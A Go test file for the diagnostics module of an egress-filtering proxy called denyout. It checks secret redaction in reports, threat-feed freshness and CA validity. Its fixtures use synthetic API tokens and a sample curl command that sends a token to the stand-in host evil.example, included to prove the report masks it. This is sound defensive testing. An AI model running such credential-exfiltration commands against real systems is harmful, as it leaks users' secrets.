package diag

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nareyko/denyout/internal/audit"
	"github.com/nareyko/denyout/internal/inspect"
	"github.com/nareyko/denyout/internal/proxy"
)

// Same token shapes the inspect redaction invariant uses.
var secretTokens = []string{
	"ghp_" + strings.Repeat("a1B2", 9),
	"sk-" + strings.Repeat("Ab1", 12),
	"sk_live_" + strings.Repeat("a", 30),
	"123456789:" + strings.Repeat("A", 35),
	"AKIAIOSFODNN7EXAMPLE",
	"xoxb-" + strings.Repeat("1", 12) + "-" + strings.Repeat("a", 24),
}

func writeAudit(t *testing.T, path string, events []audit.Event) {
	t.Helper()
	var b strings.Builder
	for _, e := range events {
		line, err := json.Marshal(e)
		if err != nil {
			t.Fatal(err)
		}
		b.Write(line)
		b.WriteByte('\n')
	}
	if err := os.WriteFile(path, []byte(b.String()), 0o600); err != nil {
		t.Fatal(err)
	}
}

func newCA(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	if _, err := proxy.LoadOrCreatePersistentCA(dir); err != nil {
		t.Fatal(err)
	}
	return dir
}

func byID(checks []Check, id string) (Check, bool) {
	for _, c := range checks {
		if c.ID == id {
			return c, true
		}
	}
	return Check{}, false
}

// The report must never contain a secret, whichever place a token hides in:
// the URL query/path/userinfo of a log line (even a legacy line that was
// written unredacted), the process label, or the last error.
func TestReportNeverContainsSecrets(t *testing.T) {
	for _, tok := range secretTokens {
		dir := t.TempDir()
		ap := filepath.Join(dir, "audit.jsonl")
		var events []audit.Event
		for i, h := range []*audit.HTTPInfo{
			{Method: "GET", Path: "/p", QueryRedacted: "x=" + tok},        // legacy unredacted query
			{Method: "GET", Path: "/bot" + tok + "/send"},                 // token in path
			{Method: "POST", Path: "/", QueryRedacted: "api_key=" + tok},  // named param
			{Method: "GET", Path: "/ok", QueryRedacted: "q=hello&page=2"}, // innocent
		} {
			events = append(events, audit.Event{
				EventID: fmt.Sprintf("e%d", i), TS: "2026-01-01T00:00:0" + fmt.Sprint(i) + "Z",
				Verdict: "deny", Reasons: []string{"secret_in_url", "host_not_allowed"},
				Detectors: []string{"github_token"},
				Network:   audit.Network{DestHost: "evil.example", DestPort: 443},
				HTTP:      h,
				Process:   "curl https://u:" + tok + "@evil.example/x",
			})
		}
		writeAudit(t, ap, events)

		r := Build(Inputs{
			Version:    "1.2.3",
			AuditPath:  ap,
			CADir:      filepath.Join(dir, "noca"),
			LastError:  "dial failed for https://evil.example/p?token=" + tok + " and header Bearer " + tok,
			Home:       dir,
			MaxDenials: 10,
		})
		text := r.Text()
		js, _ := r.JSON()
		for name, out := range map[string]string{"text": text, "json": string(js)} {
			if strings.Contains(out, tok) {
				t.Errorf("%s leaked %q:\n%s", name, tok[:6], out)
			}
		}
		if len(r.Denials) == 0 {
			t.Fatal("expected denials in report")
		}
	}
}

// Tie to the inspect invariant: whatever the scanners flag as a secret in a
// URL is masked in what the report displays.
func TestDisplayURLFollowsInspectRedaction(t *testing.T) {
	opt := inspect.Options{MinValueLen: 6, NamedQueryEnabled: true}
	for _, tok := range secretTokens {
		for _, raw := range []string{
			"https://example.com/p?x=" + tok,
			"https://example.com/bot" + tok + "/send",
			"https://" + tok + "@example.com/",
			"https://user:" + tok + "@example.com/",
		} {
			if len((inspect.Request{URL: raw}).Scan(opt)) == 0 {
				continue
			}
			if got := RedactDisplayURL(raw); strings.Contains(got, tok) {
				t.Errorf("flagged secret displayed: %q -> %q", raw, got)
			}
		}
	}
}

func TestRedactTextKeepsInnocentWords(t *testing.T) {
	in := "dial tcp 127.0.0.1:8080: connection refused"
	if got := RedactText(in); got != in {
		t.Fatalf("got %q", got)
	}
}

func TestReportShape(t *testing.T) {
	dir := t.TempDir()
	ap := filepath.Join(dir, "audit.jsonl")
	writeAudit(t, ap, []audit.Event{
		{EventID: "a", TS: "2026-01-01T00:00:01Z", Verdict: "deny", Reasons: []string{"host_not_allowed"},
			Network: audit.Network{DestHost: "one.example", DestPort: 443}},
		{EventID: "b", TS: "2026-01-01T00:00:02Z", Verdict: "deny", Reasons: []string{"threat_phishing"},
			Network: audit.Network{DestHost: "two.example", DestPort: 443}},
		{EventID: "c", TS: "2026-01-01T00:00:03Z", Verdict: "allow", Network: audit.Network{DestHost: "ok.example"}},
	})
	running := false
	r := Build(Inputs{Version: "9.9.9", AuditPath: ap, CADir: filepath.Join(dir, "ca"), ProxyRunning: &running, MaxDenials: 1})
	if r.Version != "9.9.9" || r.OS == "" {
		t.Fatalf("header: %+v", r)
	}
	if len(r.Denials) != 1 || r.Denials[0].Host != "two.example" {
		t.Fatalf("want newest denial only, got %+v", r.Denials)
	}
	if r.Denials[0].Rule != "Threat list: phishing" {
		t.Fatalf("rule: %q", r.Denials[0].Rule)
	}
	for _, id := range []string{"helper", "proxy", "ca", "threat_lists"} {
		if _, ok := byID(r.Checks, id); !ok {
			t.Errorf("missing check %s", id)
		}
	}
	txt := r.Text()
	for _, want := range []string{"Version:   9.9.9", "Last 1 denials", "two.example", "Threat list: phishing"} {
		if !strings.Contains(txt, want) {
			t.Errorf("text missing %q:\n%s", want, txt)
		}
	}
}

func TestThreatFreshness(t *testing.T) {
	dir := t.TempDir()
	now := time.Now()
	write := func(last time.Time) {
		st := map[string]any{"poll_hours": 24, "feeds": map[string]any{
			"urlhaus": map[string]any{"id": "urlhaus", "enabled": true, "last_success": last, "entry_count": 42},
		}}
		b, _ := json.Marshal(st)
		if err := os.WriteFile(filepath.Join(dir, "status.json"), b, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(now.Add(-2 * time.Hour))
	if c := threatCheck(dir, now); c.Status != OK || !strings.Contains(c.Detail, "42 entries") {
		t.Fatalf("fresh: %+v", c)
	}
	write(now.Add(-30 * 24 * time.Hour))
	c := threatCheck(dir, now)
	if c.Status != Warn || c.Fix != FixRefreshThreat {
		t.Fatalf("stale: %+v", c)
	}
	if c := threatCheck(t.TempDir(), now); c.Status != Skip {
		t.Fatalf("missing: %+v", c)
	}
}

func TestProxyCheck(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skip("no loopback")
	}
	port := ln.Addr().(*net.TCPAddr).Port
	if c := proxyCheck(Inputs{ProxyPort: port}); c.Status != OK {
		t.Fatalf("listening: %+v", c)
	}
	_ = ln.Close()
	c := proxyCheck(Inputs{ProxyPort: port, ProtectionOn: true})
	if c.Status != Fail || c.Fix != FixRetryProtect {
		t.Fatalf("closed: %+v", c)
	}
	if c := proxyCheck(Inputs{}); c.Status != Skip {
		t.Fatalf("unknown: %+v", c)
	}
}

func TestHelperCheck(t *testing.T) {
	if c := helperCheck(HelperInfo{}); c.Status != Skip {
		t.Fatalf("%+v", c)
	}
	if c := helperCheck(HelperInfo{Present: true}); c.Status != OK {
		t.Fatalf("%+v", c)
	}
	c := helperCheck(HelperInfo{Present: true, Degraded: true})
	if c.Status != Fail || c.Fix == "" {
		t.Fatalf("%+v", c)
	}
}

func TestSelfCheckMissingCA(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "ca")
	if c := SelfCheck(dir, false); len(c) != 1 || c[0].Status != Skip {
		t.Fatalf("not expected: %+v", c)
	}
	c := SelfCheck(dir, true)
	if len(c) != 1 || c[0].Status != Fail || c[0].Fix != FixRetryProtect {
		t.Fatalf("expected: %+v", c)
	}
	if _, err := os.Stat(dir); err == nil {
		t.Fatal("self-check must not create the CA directory")
	}
}

func TestSelfCheckHealthyCA(t *testing.T) {
	dir := newCA(t)
	checks := SelfCheck(dir, true)
	for _, id := range []string{"ca", "ca_valid", "intercept"} {
		c, ok := byID(checks, id)
		if !ok || c.Status != OK {
			t.Fatalf("%s: %+v (all: %+v)", id, c, checks)
		}
	}
	// The temp CA is not in the system store: a warning with a Fix, not a failure.
	os, ok := byID(checks, "os_trust")
	if !ok {
		t.Fatal("missing os_trust")
	}
	if os.Status == Fail {
		t.Fatalf("os trust must warn, not fail: %+v", os)
	}
	if os.Status == Warn && os.Fix != FixRetryProtect {
		t.Fatalf("warn needs a fix: %+v", os)
	}
}

func TestSelfCheckCorruptCA(t *testing.T) {
	dir := newCA(t)
	if err := os.WriteFile(filepath.Join(dir, "ca.crt"), []byte("not a cert"), 0o600); err != nil {
		t.Fatal(err)
	}
	checks := SelfCheck(dir, true)
	c, ok := byID(checks, "ca_valid")
	if !ok || c.Status != Fail || c.Fix != FixRegenerateCA {
		t.Fatalf("%+v", checks)
	}
	if _, ok := byID(checks, "intercept"); ok {
		t.Fatal("handshake must not run on a broken CA")
	}
}

func TestSelfCheckExpiredCA(t *testing.T) {
	dir := t.TempDir()
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "old"},
		NotBefore: time.Now().Add(-48 * time.Hour), NotAfter: time.Now().Add(-24 * time.Hour),
		IsCA: true, BasicConstraintsValid: true, KeyUsage: x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	kd, _ := x509.MarshalECPrivateKey(key)
	_ = os.WriteFile(filepath.Join(dir, "ca.crt"), pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
	_ = os.WriteFile(filepath.Join(dir, "ca.key"), pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: kd}), 0o600)
	c, ok := byID(SelfCheck(dir, true), "ca_valid")
	if !ok || c.Status != Fail || !strings.Contains(c.Detail, "expired") {
		t.Fatalf("%+v", c)
	}
}

func TestRejectsLeafFromOtherCA(t *testing.T) {
	// A client trusting CA A must reject a leaf minted by CA B: the handshake
	// check is a real trust test, not a tautology.
	a := newCA(t)
	b := newCA(t)
	sa, _ := proxy.LoadOrCreatePersistentCA(a)
	sb, _ := proxy.LoadOrCreatePersistentCA(b)
	leafB, err := sb.Leaf(selfCheckHost)
	if err != nil {
		t.Fatal(err)
	}
	pemA, _ := os.ReadFile(sa.CertFile())
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(pemA)
	if err := loopbackHandshake(leafB, pool); err == nil {
		t.Fatal("handshake should fail for a leaf from another CA")
	}
}
